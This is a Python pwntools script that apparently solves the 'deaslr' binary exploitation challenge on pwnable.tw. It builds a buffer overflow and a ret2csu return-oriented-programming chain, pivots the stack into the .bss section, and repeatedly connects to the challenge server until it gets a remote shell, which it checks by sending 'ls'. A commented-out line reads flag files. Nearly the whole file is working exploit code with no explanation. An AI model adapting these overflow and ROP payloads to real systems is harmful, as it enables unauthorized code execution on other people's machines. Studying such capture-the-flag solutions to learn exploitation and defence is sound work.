from pwn import *
import sys

elf = ELF("deaslr")
call_gets = 0x40054A
csu_init_1 = 0x4005B6
csu_init_2 = 0x4005A0
gets_got = elf.got["gets"]
gets_plt = elf.plt["gets"]
main = 0x400536
bss = 0x601010
pop_rdi = 0x4005c3
pop_rbp = 0x4004a0
add_rsp_8 = 0x4003f5
add_ebx_esi = 0x400509
pop_rsi_r15 = 0x4005c1
leave = 0x400554
pop_rsp_r13_r14_r15 = 0x4005bd
push_rbx = 0x40057A
mov_eax_0_leave = 0x40054f

# if sys.argv[1] == "l":
    # p = process("./deaslr_local", env={"LD_PRELOAD":"libc-2.23.so"})
libc = ELF("libc_64.so.6")
    # context.terminal = ["tmux", "splitw", "-h"] 
    # gdb.attach(proc.pidof(p)[0], gdbscript="""
    #                                         b *0x40057A
    #                                         continue
    #                                         """)
# elif sys.argv[1] == "r":
    # libc = ELF("libc_64.so.6")

def ret2csu(p, address, payload, ret):
    payload1 = "A"*24
    payload1 += p64(csu_init_1)
    payload1 += p64(0)
    payload1 += p64(0)  # rbx
    payload1 += p64(1)  # rbp
    payload1 += p64(gets_got)       # r12, call [r12+rbx*8]
    payload1 += p64(0)  # r13 => rdx
    payload1 += p64(0)  # r14 => rsi
    payload1 += p64(address)  # r15d => edi
    payload1 += p64(csu_init_2)
    payload1 += p64(0)*2
    payload1 += p64(bss+0x50)
    payload1 += p64(0)*4
    payload1 += p64(ret)
    
    p.sendline(payload1)
    p.sendline(payload)

def ret2csu_payload(address, rbp):
    payload1 = p64(csu_init_1)
    payload1 += p64(0)
    payload1 += p64(0)  # rbx
    payload1 += p64(1)  # rbp
    payload1 += p64(gets_got)       # r12, call [r12+rbx*8]
    payload1 += p64(0)  # r13 => rdx
    payload1 += p64(0)  # r14 => rsi
    payload1 += p64(address)  # r15d => edi
    payload1 += p64(csu_init_2)
    payload1 += p64(0)*2
    payload1 += p64(rbp)
    payload1 += p64(0)*4
    
    return payload1

count = 0
# def solve():
while True:
    
    # p = process("./deaslr", env={"LD_PRELOAD":"libc_64.so.6"})
    p = remote("chall.pwnable.tw", 10402)

    # execute gets in bss section
    payload = "A"*0x58 + ret2csu_payload(bss+0x200, rbp=bss) + ret2csu_payload(bss+0x10, rbp=bss) + ret2csu_payload(bss+0x20, rbp=bss+0x8) + p64(leave)

    # send payload and migrate stack to bss section
    ret2csu(p, bss, payload, leave)

    payload2 = p64(pop_rsi_r15) + p64(0xfffffffffffd6616) + p64(0) + p64(add_ebx_esi) + p64(push_rbx) + p64(bss+0x2a0) + p64(0)*4 + p64(leave)   # rop calculate rdx

    payload2 += "B"*0x50

    payload2 += ret2csu_payload(bss+0x200, rbp=bss) + ret2csu_payload(bss+0x224, rbp=bss+0x200-0x8) + p64(0x40054f) 

    # payload to 
    p.sendline(payload2)

    p.sendline(p64(0x4005BA))

    p.sendline(p64(bss+0x200-0x8) + p64(0)*4 + p64(leave))      # ret2calculate rdx

    p.sendline(p64(0x4005BA) + p64(0)*2 + p32(bss+0x220))      

    p.sendline(p32(0x7fba)+ p64(0)*2 + p64(0x4005A9))
    count+=1
    print count
    # try:
    print "??"
    p.sendline("ls")

    try:
        tmp = p.recv(timeout=0.1)
        if len(tmp) > 0:
            p.interactive()
        p.close()
        continue
        # if "FLAG" in tmp:
        #     p.interactive()
        #     break
        # else:
        #     p.close()
        #     continue
        # p.sendline("cat /home/*/flag")
    except:
        print "??"
        p.close()
        continue
        # else:
        #     p.close()
        #     continue
        # print p.recv()
    # except:
    #     p.close()
    #     continue
    # p.interactive()
